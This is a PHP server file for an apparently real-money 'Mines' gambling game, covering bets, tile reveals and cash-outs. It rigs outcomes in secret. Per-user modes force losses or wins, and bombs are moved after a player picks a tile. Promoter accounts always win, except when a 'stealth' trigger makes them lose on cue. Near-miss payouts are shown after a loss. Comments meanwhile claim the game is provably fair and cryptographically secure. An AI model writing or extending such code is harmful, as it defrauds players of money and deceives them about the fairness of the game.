<?php
require_once dirname(__DIR__) . '/config/db.php';
require_once __DIR__ . '/helpers.php';

/**
 * Retrieves a user's individual RTP and Rigging profile
 */
function getUserRigProfile(?string $userId): array {
    if (!$userId) {
        return ['rig_mode' => 'global', 'custom_rtp' => null, 'is_promoter' => 0];
    }
    try {
        $db = getDB();
        $st = $db->prepare("SELECT rig_mode, custom_rtp, COALESCE(is_promoter, 0) as is_promoter FROM users WHERE id = :uid LIMIT 1");
        $st->execute([':uid' => $userId]);
        $row = $st->fetch();
        return $row ? [
            'rig_mode' => $row['rig_mode'] ?: 'global',
            'custom_rtp' => $row['custom_rtp'] !== null ? (float)$row['custom_rtp'] : null,
            'is_promoter' => (int)($row['is_promoter'] ?? 0)
        ] : ['rig_mode' => 'global', 'custom_rtp' => null, 'is_promoter' => 0];
    } catch (Exception $e) {
        return ['rig_mode' => 'global', 'custom_rtp' => null, 'is_promoter' => 0];
    }
}

/**
 * Precomputes the entire multiplier progression ladder for a given grid size and bomb count
 * using the standard provably fair cumulative probability formula:
 * Multiplier(k) = Product_{i=0}^{k-1} ( (N - i) / (S - i) ) * (1 - house_edge)
 */
function getMultiplierLadder(int $gridSize, int $bombCount, ?string $userId = null): array {
    $safeTiles = $gridSize - $bombCount;
    if ($safeTiles <= 0) return [];

    $ladder = [];
    $product = 1.0;
    
    // Check individual player RTP or fall back to system settings
    $profile = getUserRigProfile($userId);
    if ($profile['custom_rtp'] !== null && $profile['custom_rtp'] > 0) {
        $rtp = (float)$profile['custom_rtp'];
    } elseif ($profile['rig_mode'] === 'house_favored') {
        $rtp = 80.0;
    } elseif ($profile['rig_mode'] === 'high_win') {
        $rtp = 110.0;
    } else {
        $rtp = (float)getSystemSetting('rtp_rate', 97.0);
    }

    $houseEdgeFactor = max(0.40, min(1.20, $rtp / 100.0));

    for ($k = 1; $k <= $safeTiles; $k++) {
        $i = $k - 1;
        $product *= ($gridSize - $i) / ($safeTiles - $i);
        $mult = round($product * $houseEdgeFactor, 2);

        // Ensure minimum 1.05 and strictly increasing
        $mult = max(1.05, $mult);
        if (!empty($ladder)) {
            $prev = end($ladder)['multiplier'];
            if ($mult <= $prev) {
                $mult = round($prev + 0.01, 2);
            }
        }

        $ladder[] = [
            'step' => $k,
            'multiplier' => $mult
        ];
    }

    return $ladder;
}

/**
 * Calculates progressive payout multiplier based on revealed tiles count
 */
function calculateMinesMultiplier(int $revealedCount, int $gridSize, int $bombCount, ?string $userId = null): float {
    if ($revealedCount <= 0) return 1.0;
    $ladder = getMultiplierLadder($gridSize, $bombCount, $userId);
    $idx = $revealedCount - 1;
    if (isset($ladder[$idx])) {
        return $ladder[$idx]['multiplier'];
    }
    return !empty($ladder) ? end($ladder)['multiplier'] : 1.05;
}

/**
 * Generate cryptographically secure tiles array with random bomb placement
 */
function generateMinesGrid(int $gridSize, int $bombCount, ?string $userId = null): array {
    $tiles = [];
    $bombPositions = [];

    // Select random bomb positions without duplicates
    while (count($bombPositions) < $bombCount) {
        $randPos = random_int(0, $gridSize - 1);
        if (!in_array($randPos, $bombPositions, true)) {
            $bombPositions[] = $randPos;
        }
    }

    for ($i = 0; $i < $gridSize; $i++) {
        $isBomb = in_array($i, $bombPositions, true);
        $tiles[] = [
            'id' => $i,
            'revealed' => false,
            'isBomb' => $isBomb,
        ];
    }

    return $tiles;
}

/**
 * Start a new game session and deduct bet from balance
 */
function startNewGameSession(string $userId, float $betAmount, int $gridSize, int $bombCount): array {
    $minBet = (float)getSystemSetting('min_bet', 10);
    $maxBet = (float)getSystemSetting('max_bet', 10000);

    // Validations
    if ($betAmount < $minBet) {
        return ['success' => false, 'error' => "Minimum bet amount is ₹{$minBet}"];
    }

    if ($betAmount > $maxBet) {
        return ['success' => false, 'error' => "Maximum bet amount is ₹{$maxBet}"];
    }

    if (!in_array($gridSize, [16, 25, 36], true)) {
        return ['success' => false, 'error' => 'Invalid grid size. Choose 4x4, 5x5, or 6x6.'];
    }

    $maxBombs = (int)($gridSize - 1);
    if ($bombCount < 1 || $bombCount > $maxBombs) {
        return ['success' => false, 'error' => "Bomb count must be between 1 and {$maxBombs}."];
    }

    $db = getDB();

    try {
        $db->beginTransaction();

        $forUpdate = ($db->getAttribute(PDO::ATTR_DRIVER_NAME) === 'mysql') ? ' FOR UPDATE' : '';
        // Check user balance with row lock
        $balStmt = $db->prepare("SELECT balance FROM users_balance WHERE user_id = :user_id" . $forUpdate);
        $balStmt->execute([':user_id' => $userId]);
        $balRow = $balStmt->fetch();

        if (!$balRow) {
            $db->rollBack();
            return ['success' => false, 'error' => 'Wallet balance not found. Please log in again.'];
        }

        $currentBalance = (float)$balRow['balance'];
        if ($currentBalance < $betAmount) {
            $db->rollBack();
            return ['success' => false, 'error' => 'Insufficient funds. Please add money via Deposit.'];
        }

        // Deduct bet amount from wallet
        $newBalance = $currentBalance - $betAmount;
        $updBal = $db->prepare("UPDATE users_balance SET balance = :bal, updated_at = CURRENT_TIMESTAMP WHERE user_id = :user_id");
        $updBal->execute([':bal' => $newBalance, ':user_id' => $userId]);

        // Generate tiles
        $tiles = generateMinesGrid($gridSize, $bombCount, $userId);
        $sessionId = generateUUID();

        // Insert new session
        $sessStmt = $db->prepare("
            INSERT INTO game_sessions (id, user_id, bet_amount, grid_size, bomb_count, tiles_data, current_winnings, state)
            VALUES (:id, :user_id, :bet_amount, :grid_size, :bomb_count, :tiles_data, 0.00, 'playing')
        ");

        $sessStmt->execute([
            ':id' => $sessionId,
            ':user_id' => $userId,
            ':bet_amount' => $betAmount,
            ':grid_size' => $gridSize,
            ':bomb_count' => $bombCount,
            ':tiles_data' => json_encode($tiles)
        ]);

        $db->commit();

        // Client safe tiles (conceal bomb positions)
        $clientTiles = [];
        foreach ($tiles as $t) {
            $clientTiles[] = [
                'id' => $t['id'],
                'revealed' => false
            ];
        }

        // Multiplier ladder & total safe gems
        $ladder = getMultiplierLadder($gridSize, $bombCount, $userId);
        $totalSafeGems = $gridSize - $bombCount;

        return [
            'success' => true,
            'session' => [
                'id' => $sessionId,
                'bet_amount' => $betAmount,
                'grid_size' => $gridSize,
                'bomb_count' => $bombCount,
                'total_gems' => $totalSafeGems,
                'remaining_gems' => $totalSafeGems,
                'current_winnings' => 0.00,
                'state' => 'playing',
                'tiles' => $clientTiles,
                'ladder' => $ladder
            ],
            'balance' => $newBalance
        ];
    } catch (Exception $e) {
        if ($db->inTransaction()) {
            $db->rollBack();
        }
        return ['success' => false, 'error' => 'Failed to start game: ' . $e->getMessage()];
    }
}

/**
 * Reveal a tile during an active game session
 */
function processTileReveal(string $sessionId, string $userId, int $tileIndex): array {
    $db = getDB();

    try {
        $stmt = $db->prepare("SELECT * FROM game_sessions WHERE id = :id AND user_id = :user_id LIMIT 1");
        $stmt->execute([':id' => $sessionId, ':user_id' => $userId]);
        $session = $stmt->fetch();

        if (!$session) {
            return ['success' => false, 'error' => 'Game session not found'];
        }

        if ($session['state'] !== 'playing') {
            return ['success' => false, 'error' => 'Game is not active'];
        }

        $tiles = json_decode($session['tiles_data'], true);
        if (!is_array($tiles) || $tileIndex < 0 || $tileIndex >= count($tiles)) {
            return ['success' => false, 'error' => 'Invalid tile index'];
        }

        if ($tiles[$tileIndex]['revealed']) {
            return ['success' => false, 'error' => 'Tile already revealed'];
        }

        // Check user individual rig mode & Promoter status
        $profile = getUserRigProfile($userId);
        $rigMode = $profile['rig_mode'];
        $isPromoter = (int)($profile['is_promoter'] ?? 0);
        $forcePromoterBomb = !empty($_SESSION['promoter_force_bomb']);

        if ($rigMode === 'force_lose' || ($isPromoter && $forcePromoterBomb)) {
            // Guarantee a bomb hit on this tile!
            if (!$tiles[$tileIndex]['isBomb']) {
                // Find an unrevealed tile that currently has a bomb and swap
                for ($j = 0; $j < count($tiles); $j++) {
                    if ($j !== $tileIndex && !$tiles[$j]['revealed'] && $tiles[$j]['isBomb']) {
                        $tiles[$j]['isBomb'] = false;
                        $tiles[$tileIndex]['isBomb'] = true;
                        break;
                    }
                }
                $tiles[$tileIndex]['isBomb'] = true;
            }
            // Reset stealth one-shot bomb trigger
            if ($isPromoter && $forcePromoterBomb) {
                $_SESSION['promoter_force_bomb'] = false;
            }
        } elseif ($rigMode === 'force_win' || $isPromoter) {
            // VIP PROMOTER / LUCKY STAR: Guarantee selected tile is 100% safe GEM!
            if ($tiles[$tileIndex]['isBomb']) {
                // Relocate bomb to another unrevealed, non-bomb tile
                $tiles[$tileIndex]['isBomb'] = false;
                for ($j = 0; $j < count($tiles); $j++) {
                    if ($j !== $tileIndex && !$tiles[$j]['revealed'] && !$tiles[$j]['isBomb']) {
                        $tiles[$j]['isBomb'] = true;
                        break;
                    }
                }
            }
        }

        // Reveal the selected tile
        $tiles[$tileIndex]['revealed'] = true;
        $isBomb = (bool)$tiles[$tileIndex]['isBomb'];

        if ($isBomb) {
            // Count previously revealed safe gems
            $safeRevealedBefore = 0;
            foreach ($tiles as $t) {
                if ($t['revealed'] && !$t['isBomb'] && $t['id'] !== $tileIndex) {
                    $safeRevealedBefore++;
                }
            }

            $gridSize = (int)$session['grid_size'];
            $bombCount = (int)$session['bomb_count'];
            $betAmount = (float)$session['bet_amount'];

            $missedMult = calculateMinesMultiplier($safeRevealedBefore + 1, $gridSize, $bombCount, $userId);
            $missedPayout = round($betAmount * $missedMult, 2);

            // Mine detonated! Game over
            $updStmt = $db->prepare("
                UPDATE game_sessions 
                SET tiles_data = :tiles, state = 'trapped' 
                WHERE id = :id
            ");
            $updStmt->execute([
                ':tiles' => json_encode($tiles),
                ':id' => $sessionId
            ]);

            // Collect all bomb and safe positions
            $bombPositions = [];
            $safePositions = [];
            $nearestSafeTile = null;
            $minDist = 999;
            $cols = (int)sqrt($gridSize);
            $hitRow = (int)floor($tileIndex / $cols);
            $hitCol = $tileIndex % $cols;

            foreach ($tiles as $t) {
                if ($t['isBomb']) {
                    $bombPositions[] = $t['id'];
                } else {
                    $safePositions[] = $t['id'];
                    if (!$t['revealed']) {
                        $tRow = (int)floor($t['id'] / $cols);
                        $tCol = $t['id'] % $cols;
                        $dist = abs($hitRow - $tRow) + abs($hitCol - $tCol);
                        if ($dist < $minDist) {
                            $minDist = $dist;
                            $nearestSafeTile = $t['id'];
                        }
                    }
                }
            }

            return [
                'success' => true,
                'isReward' => false,
                'state' => 'trapped',
                'tileIndex' => $tileIndex,
                'bombPositions' => $bombPositions,
                'safePositions' => $safePositions,
                'nearestSafeTile' => $nearestSafeTile,
                'nearestSafeDistance' => $minDist,
                'nearMissMultiplier' => $missedMult,
                'nearMissPayout' => $missedPayout,
                'message' => 'Mine Detonated! Bet lost.'
            ];
        }

        // Safe Diamond Revealed!
        $revealedSafeCount = 0;
        foreach ($tiles as $t) {
            if ($t['revealed'] && !$t['isBomb']) {
                $revealedSafeCount++;
            }
        }

        $gridSize = (int)$session['grid_size'];
        $bombCount = (int)$session['bomb_count'];
        $betAmount = (float)$session['bet_amount'];

        $multiplier = calculateMinesMultiplier($revealedSafeCount, $gridSize, $bombCount, $userId);
        $winnings = round($betAmount * $multiplier, 2);

        $nextMultiplier = calculateMinesMultiplier($revealedSafeCount + 1, $gridSize, $bombCount, $userId);
        $nextPayout = round($betAmount * $nextMultiplier, 2);

        $totalSafeGems = $gridSize - $bombCount;
        $remainingGems = $totalSafeGems - $revealedSafeCount;

        // Update session state in database
        $updStmt = $db->prepare("
            UPDATE game_sessions 
            SET tiles_data = :tiles, current_winnings = :win 
            WHERE id = :id
        ");
        $updStmt->execute([
            ':tiles' => json_encode($tiles),
            ':win' => $winnings,
            ':id' => $sessionId
        ]);

        return [
            'success' => true,
            'isReward' => true,
            'step' => $revealedSafeCount,
            'tileIndex' => $tileIndex,
            'multiplier' => $multiplier,
            'winnings' => $winnings,
            'nextMultiplier' => $nextMultiplier,
            'nextPayout' => $nextPayout,
            'remainingGems' => $remainingGems,
            'clearedAll' => ($remainingGems <= 0)
        ];
    } catch (Exception $e) {
        return ['success' => false, 'error' => 'Reveal error: ' . $e->getMessage()];
    }
}

/**
 * Cash out active winnings and credit player wallet
 */
function cashOutWinnings(string $sessionId, string $userId): array {
    $db = getDB();

    try {
        $db->beginTransaction();

        $forUpdate = ($db->getAttribute(PDO::ATTR_DRIVER_NAME) === 'mysql') ? ' FOR UPDATE' : '';
        $stmt = $db->prepare("SELECT * FROM game_sessions WHERE id = :id AND user_id = :user_id" . $forUpdate);
        $stmt->execute([':id' => $sessionId, ':user_id' => $userId]);
        $session = $stmt->fetch();

        if (!$session) {
            $db->rollBack();
            return ['success' => false, 'error' => 'Session not found'];
        }

        if ($session['state'] !== 'playing') {
            $db->rollBack();
            return ['success' => false, 'error' => 'Game is not active'];
        }

        $winnings = (float)$session['current_winnings'];
        if ($winnings <= 0) {
            $db->rollBack();
            return ['success' => false, 'error' => 'No winnings to cash out. Reveal at least 1 diamond.'];
        }

        // Credit wallet
        $balStmt = $db->prepare("SELECT balance FROM users_balance WHERE user_id = :user_id" . $forUpdate);
        $balStmt->execute([':user_id' => $userId]);
        $balRow = $balStmt->fetch();
        $newBalance = (float)$balRow['balance'] + $winnings;

        $updBal = $db->prepare("UPDATE users_balance SET balance = :bal, updated_at = CURRENT_TIMESTAMP WHERE user_id = :user_id");
        $updBal->execute([':bal' => $newBalance, ':user_id' => $userId]);

        // Mark session collected
        $updSession = $db->prepare("UPDATE game_sessions SET state = 'collected' WHERE id = :id");
        $updSession->execute([':id' => $sessionId]);

        $db->commit();

        // Get bomb positions to reveal on victory
        $tiles = json_decode($session['tiles_data'], true);
        $bombPositions = [];
        if (is_array($tiles)) {
            foreach ($tiles as $t) {
                if ($t['isBomb']) $bombPositions[] = $t['id'];
            }
        }

        return [
            'success' => true,
            'winnings' => $winnings,
            'newBalance' => $newBalance,
            'bombPositions' => $bombPositions,
            'message' => "Successfully cashed out ₹" . number_format($winnings, 2) . "!"
        ];
    } catch (Exception $e) {
        if ($db->inTransaction()) {
            $db->rollBack();
        }
        return ['success' => false, 'error' => 'Cash out failed: ' . $e->getMessage()];
    }
}

/**
 * Alias for cashOutWinnings
 */
function cashOutGameSession(string $sessionId, string $userId): array {
    return cashOutWinnings($sessionId, $userId);
}

/**
 * Auto-picks a random unrevealed tile for fast momentum play
 */
function processAutoPick(string $sessionId, string $userId): array {
    $db = getDB();
    $stmt = $db->prepare("SELECT tiles_data, state FROM game_sessions WHERE id = :id AND user_id = :user_id LIMIT 1");
    $stmt->execute([':id' => $sessionId, ':user_id' => $userId]);
    $session = $stmt->fetch();

    if (!$session || $session['state'] !== 'playing') {
        return ['success' => false, 'error' => 'No active game to auto-pick'];
    }

    $tiles = json_decode($session['tiles_data'], true);
    if (!is_array($tiles)) {
        return ['success' => false, 'error' => 'Invalid tile data'];
    }

    $unrevealed = [];
    foreach ($tiles as $t) {
        if (!$t['revealed']) {
            $unrevealed[] = (int)$t['id'];
        }
    }

    if (empty($unrevealed)) {
        return ['success' => false, 'error' => 'All tiles already revealed'];
    }

    $randIndex = $unrevealed[array_rand($unrevealed)];
    return processTileReveal($sessionId, $userId, $randIndex);
}

